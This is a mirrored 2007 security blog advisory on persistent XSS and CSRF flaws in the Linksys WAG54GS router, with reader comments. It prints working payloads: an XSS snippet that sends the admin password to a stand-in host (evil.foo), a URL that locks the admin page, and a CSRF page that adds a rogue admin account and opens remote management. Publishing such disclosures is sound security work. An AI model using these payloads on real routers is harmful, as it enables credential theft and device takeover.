@@ -1,0 +1,255 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/persistent-xss-and-csrf-on-wireless-g-adsl-gateway-with-speedbooster-wag54gs/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:58:53 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; Persistent XSS and CSRF on Wireless-G ADSL Gateway with SpeedBooster (WAG54GS)</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Persistent XSS and CSRF on Wireless-G ADSL Gateway with SpeedBooster (WAG54GS) Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='OWASP USA 2007 AppSec Conference' href='../owasp-usa-2007-appsec-conference/index.html' />
+<link rel='next' title='CSRF Demystified' href='../csrf-demystified/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../indexfe50.html?p=574' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-574" class="post">
+	<div class="post-title"><h2><span>Persistent XSS and CSRF on Wireless-G ADSL Gateway with SpeedBooster (WAG54GS)</span></h2></div>
+	<div class="post-date"><span>published:</span> November 20th, 2007</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>I really think that web interfaces are the <em>low-hanging fruit</em> of embedded devices. Sure classic attacks such as predictable SNMP community strings, exposed TFTP services and buffer overflows still apply. However, by exploiting the web interface we can steal the data we want, we can enable remote access to the compromised router, we own the victim&#8217;s connection. In short, bugs on the web interface gives us all we need! Anyway, enough talking! The following are some of the issues I found on the Cisco Linksys WAG54GS.</p>
+
+<p>The following vulns were found on 24 June 2007 and were tested against firmware V1.00.06. The specific persistent XSS holes mentioned in this advisory were fixed by Cisco on firmware version V1.01.03. However, there are still several other persistent XSS plus the system-wide CSRF in the latest firmware. <a href="http://nvd.nist.gov/nvd.cfm?cvename=CVE-2007-3574">CVE-2007-3574</a> has been assigned to these issues. Thanks a lot to Cisco for being so great when dealing with my emails! Credits also go to pdp for providing feedback, ideas and allowing me to play with his spare <a href="http://snipurl.com/1txmt">WAG54GS</a> router.</p>
+
+<p>By the way, part of this advisory got leaked some time ago on FD, but I am publishing it as a formal release with additional information including a password leak which can be combined with any of the persistent XSS holes found (keep reading for more info on this).</p>
+
+<h3>Description</h3>
+
+<p>There are several persistent XSS vulnerabilities on the <code>/setup.cgi</code> script. It is possible to inject JavaScript by assigning a payload like the following to any of the vulnerable parameters:</p>
+
+<pre><code>&gt;&lt;script&gt;[PAYLOAD]&lt;/script&gt;</code></pre>
+
+<p>The vulnerable (non-sanitized) parameters are the following: <code>devname</code>, <code>snmp_getcomm</code>, <code>snmp_setcomm</code>, <code>c4_trap_ip_</code>. Additionally, all HTTP requests are not tokenized with random values. Thus, all requests to the router&#8217;s HTTP interface are vulnerable to Cross-site Request Forgeries (CSRF), perhaps by design. The following is an example of a HTTP request (notice the lack of non-predictable tokens):</p>
+
+<pre><code>POST /setup.cgi HTTP/1.1
+Authorization: Basic YWRtaW46YWRtaW4=
+
+mtenRestore=Restore+Factory+Defaults&amp;todo=defaultsettings&amp;this_file=Factorydefaults.htm&amp;next_file=index.htm&amp;message=</code></pre>
+
+<p>Although the original request is a POST, we can convert it to a GET, so that all posted parameters can be submitted on a single URL. For example, the previous POST request can be converted to a URL such as the following:</p>
+
+<pre><code>http://admin:admin@192.168.1.1/setup.cgi?mtenRestore=Restore+Factory+Defaults&amp;todo=defaultsettings&amp;this_file=Factorydefaults.htm&amp;next_file=index.htm&amp;message=</code></pre>
+
+<p>By forging administrative requests (Administration button on the router&#8217;s HTML menu), an attacker can compromise the router provided the victim user visits a malicious URL or HTML page. The attack can only be successful if the administrator hasn&#8217;t changed the default credentials (admin/admin) or the administrator&#8217;s browser has an active authentication session with the router&#8217;s interface when the attack happens (highly unlikely)</p>
+
+<h3>Persistent XSS PoC</h3>
+
+<p>The following URL creates a DoS condition by making the Administration page inaccessible since <code>history.back()</code> will run every time the Administration page is visited. Thus the administrator won&#8217;t be able to ever change the default credentials unless a hard reset is performed by using the router&#8217;s physical &#8220;restart&#8221; switch:</p>
+
+<pre><code>http://admin:admin@192.168.1.1/setup.cgi?user_list=1&amp;sysname=admin&amp;sysPasswd=admin&amp;sysConfirmPasswd=admin&amp;remote_management=enable&amp;http_wanport=8080&amp;devname=&amp;snmp_enable=disable&amp;upnp_enable=enable&amp;wlan_enable=enable&amp;save=Save+Settings&amp;h_user_list=1&amp;h_pwset=yes&amp;pwchanged=yes&amp;h_remote_management=enable&amp;c4_trap_ip_="&gt;history.back()&amp;h_snmp_enable=enable&amp;h_upnp_enable=enable&amp;h_wlan_enable=enable&amp;todo=save&amp;this_file=Administration.htm&amp;next_file=Administration.htm&amp;message=</code></pre>
+
+<p>Note that he administration page (<code>/setup.cgi?next_file=Administration.htm</code>) returns the admin password within the client-side HTML source code as a hidden field. i.e.:</p>
+
+<pre><code>&lt;input type=&quot;hidden&quot; name=&quot;old_pwd&quot; value=&quot;admin&quot;&gt;</code></pre>
+
+<p>Therefore, we could also inject a payload in our persistent XSS attack which accesses the admin password through the DOM object:</p>
+
+<pre><code>document.administration.old_pwd.value</code></pre>
+
+<p>&#8230;and submits it to the attacker&#8217;s site every time the page is accessed. That way, even if the victim admin changed the password, the attacker would receive the value of the new password! Here is an example payload:</p>
+
+<pre><code>&quot;&gt;&lt;script&gt;img=new Image();img.src=&apos;http://evil.foo/?last_pwd=&apos;+document.administration.old_pwd.value&lt;/script&gt;&lt;a b=&quot;</code></pre>
+
+<h3>CSRF PoC</h3>
+
+<p>The following HTML page does the following:</p>
+
+<ul>
+<li>adds an additional administrative account, with a username equals to &#8216;attacker&#8217; and a password equals to 0wned (without removing original admin account!)</li>
+<li>enables remote HTTP management over port 1337</li>
+<li>sets other settings that are inrelevant to this discussion</li>
+</ul>
+
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+	&lt;script&gt;
+	// send 2 requests to add an administrative account and enable remote management
+	// tries with default credentials and with credentials cached by browser (if any)
+
+	var img = new Image();
+	var img2 = new Image();
+
+	img.src = &apos;http://admin:admin@192.168.1.1/setup.cgi?user_list=8&amp;sysname=attacker&amp;sysPasswd=0wned&amp;sysConfirmPasswd=0wned&amp;remote_management=enable&amp;http_wanport=1337&amp;devname=&amp;snmp_enable=disable&amp;upnp_enable=enable&amp;wlan_enable=enable&amp;save=Save+Settings&amp;h_user_list=8&amp;h_pwset=yes&amp;pwchanged=yes&amp;h_remote_management=enable&amp;c4_trap_ip_=&amp;h_snmp_enable=disable&amp;h_upnp_enable=enable&amp;h_wlan_enable=enable&amp;todo=save&amp;this_file=Administration.htm&amp;next_file=Administration.htm&amp;message=&apos;;
+	img2.src = &apos;http://192.168.1.1/setup.cgi?user_list=8&amp;sysname=attacker&amp;sysPasswd=0wned&amp;sysConfirmPasswd=0wned&amp;remote_management=enable&amp;http_wanport=1337&amp;devname=&amp;snmp_enable=disable&amp;upnp_enable=enable&amp;wlan_enable=enable&amp;save=Save+Settings&amp;h_user_list=8&amp;h_pwset=yes&amp;pwchanged=yes&amp;h_remote_management=enable&amp;c4_trap_ip_=&amp;h_snmp_enable=disable&amp;h_upnp_enable=enable&amp;h_wlan_enable=enable&amp;todo=save&amp;this_file=Administration.htm&amp;next_file=Administration.htm&amp;message=&apos;;
+	&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+<p>The first URL forges the administrative request using the default credentials, so it won&#8217;t work if default credentials have been changed. The second URL doesn&#8217;t specify any credentials as an attempt to use the browser&#8217;s cached credentials. If the admin user has clicked on &#8220;Save password&#8221; on the basic authentication prompt, most browsers will prompt the user to confirm submitting the cached credentials. The only situation in which browsers won&#8217;t ask the user to confirm submitting the credentials would be if the malicious CSRF page was visited while the browser has an active authenticated session with the router&#8217;s HTTP interface (very unlikely).</p>
+
+<h3>Additional notes</h3>
+
+<ul>
+<li>router reboots after saving settings (requests sent to <code>setup.cgi</code>)</li>
+<li>all attacks were tested using Internet Explorer 7</li>
+</ul><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pagvac/index.html" title="Posts by pagvac" rel="author">pagvac</a></div>
+	</div>
+				
+
+				<div id="post-comments">
+					<div class="comment even thread-even depth-1" id="comment-74656">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/129b6f1bf6c627d5ca57779bd15ea649?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Jordan</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-74656">
+			November 20, 2007 at 9:58 pm</a>		</div>
+
+		<p>One kinda tangential question &#8212; I haven&#8217;t played with it in a little while, but when I was doing something similar with a linksys a while back, if you specified the username:password in the url in a link, Firefox would trap the request and alert the user.  </p>
+<p>Is there a type of request that bypasses that, or does IE7 not have the same feature? </p>
+<p>I realize that doesn&#8217;t actually fix the problem, but it at least does give the user a chance to say no and keeps the CSRF from working without their knowledge if they know what they&#8217;re doing (hah!)</p>
+<p>Unless of course they&#8217;re still logged in to the router when the attack occurs in which case no need to pass the credentials in the URL at all&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-74721">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-74721">
+			November 21, 2007 at 12:01 am</a>		</div>
+
+		<p>Jordan, newer browsers like FF 2 spawn a warning when typing &#8216;http://admin:admin@192.168.1.1/&#8217; and similar URLs which submit basic auth credentials.</p>
+<p>However, when playing with these attacks I remember getting more a interesting behavior on FF 2 if embedding URLs within HTML &#8211; ie: on iframes.</p>
+<p>Anyway, the best persistent XSS/CSRF type of flaw you can get is within log facilities. Reason being is that when the injected payload is triggered, the victim admin must be logged in by design (in order to check the logs) &#8211; hence no need to submit the password along the CSRFed request. </p>
+<p>I found something like this on Axis IP cameras: <a href="http://www.procheckup.com/Vulnerability_Axis_2100_research.pdf" rel="nofollow">http://www.procheckup.com/Vuln.....search.pdf</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-78295">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/271ecedbd232e23677ddc1d3956147eb?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://hackathology.blogspot.com/' rel='external nofollow' class='url'>hackathology</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-78295">
+			November 28, 2007 at 5:09 pm</a>		</div>
+
+		<p>Nice one</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="574"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="0accf8bec8" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/persistent-xss-and-csrf-on-wireless-g-adsl-gateway-with-speedbooster-wag54gs/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:58:53 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
